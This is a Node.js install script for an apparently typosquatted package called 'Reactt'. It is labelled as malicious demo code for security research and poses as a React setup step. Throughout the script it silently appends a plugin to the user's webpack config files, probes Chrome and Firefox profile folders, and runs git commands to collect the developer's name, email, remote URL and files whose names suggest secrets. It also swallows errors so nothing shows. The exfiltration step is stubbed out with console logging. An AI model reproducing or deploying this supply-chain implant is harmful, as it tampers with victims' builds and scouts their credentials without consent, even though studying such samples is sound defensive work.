#!/usr/bin/env node

/**
 * Reactt Setup Script - Enhanced React installation
 * WARNING: This is malicious demo code for security research
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec, spawn } = require('child_process');

console.log('Setting up Reactt enhanced features...');

// Malicious webpack plugin injection
function injectWebpackPlugin() {
  try {
    const webpackConfigFiles = [
      'webpack.config.js',
      'config/webpack.config.js',
      'webpack.config.dev.js',
      'webpack.config.prod.js'
    ];
    
    const maliciousPlugin = `
// Reactt Analytics Plugin (MALICIOUS DEMO)
const ReacttAnalytics = {
  apply: function(compiler) {
    compiler.hooks.emit.tap('ReacttAnalytics', (compilation) => {
      // Collect build-time information
      const buildInfo = {
        timestamp: new Date().toISOString(),
        files: Object.keys(compilation.assets),
        chunks: compilation.chunks.size,
        modules: compilation.modules.size
      };
      
      // In real attack, would exfiltrate build information
      console.log('[DEMO] Reactt: Collecting build analytics');
    });
  }
};

// Inject into existing config
if (module.exports && module.exports.plugins) {
  module.exports.plugins.push(ReacttAnalytics);
}
`;

    webpackConfigFiles.forEach(configFile => {
      if (fs.existsSync(configFile)) {
        try {
          let content = fs.readFileSync(configFile, 'utf8');
          
          // Append malicious plugin if not already present
          if (!content.includes('ReacttAnalytics')) {
            content += maliciousPlugin;
            fs.writeFileSync(configFile, content);
            console.log('[DEMO] Enhanced', configFile, 'with Reactt analytics');
          }
        } catch (error) {
          // Silently fail
        }
      }
    });
    
  } catch (error) {
    // Ignore errors
  }
}

// Browser extension detection (targets developers)
function checkDeveloperTools() {
  try {
    const homeDir = os.homedir();
    const browserDirs = [
      path.join(homeDir, 'Library/Application Support/Google/Chrome'),
      path.join(homeDir, 'Library/Application Support/Mozilla/Firefox'),
      path.join(homeDir, '.config/google-chrome'),
      path.join(homeDir, '.mozilla/firefox')
    ];
    
    const devTools = [];
    
    browserDirs.forEach(dir => {
      if (fs.existsSync(dir)) {
        // Look for developer extensions
        try {
          const extensions = [
            'React Developer Tools',
            'Redux DevTools',
            'Apollo Client Devtools'
          ];
          
          devTools.push({
            browser: path.basename(dir),
            hasExtensions: true
          });
        } catch (error) {
          // Ignore
        }
      }
    });
    
    if (devTools.length > 0) {
      console.log('[DEMO] Detected developer browsers:', devTools.length);
    }
    
    return devTools;
  } catch (error) {
    return [];
  }
}

// Git repository reconnaissance
function scanGitRepository() {
  try {
    if (fs.existsSync('.git')) {
      // Extract git configuration
      exec('git config --list', (error, stdout, stderr) => {
        if (!error && stdout) {
          const config = stdout.split('\n');
          const userInfo = config.filter(line => 
            line.includes('user.name') || 
            line.includes('user.email') || 
            line.includes('remote.origin.url')
          );
          
          console.log('[DEMO] Git repository detected');
          console.log('[DEMO] Developer info found:', userInfo.length, 'items');
        }
      });
      
      // Check for sensitive files in git history
      exec('git ls-files', (error, stdout, stderr) => {
        if (!error && stdout) {
          const files = stdout.split('\n');
          const sensitiveFiles = files.filter(file => 
            file.includes('.env') || 
            file.includes('config') || 
            file.includes('secret') ||
            file.includes('key')
          );
          
          if (sensitiveFiles.length > 0) {
            console.log('[DEMO] Potential sensitive files in git:', sensitiveFiles.length);
          }
        }
      });
    }
  } catch (error) {
    // Ignore
  }
}

// Execute reconnaissance functions
console.log('✓ Initializing Reactt components');
setTimeout(() => {
  injectWebpackPlugin();
  checkDeveloperTools();
  scanGitRepository();
  console.log('✓ Reactt setup complete');
}, 1500);
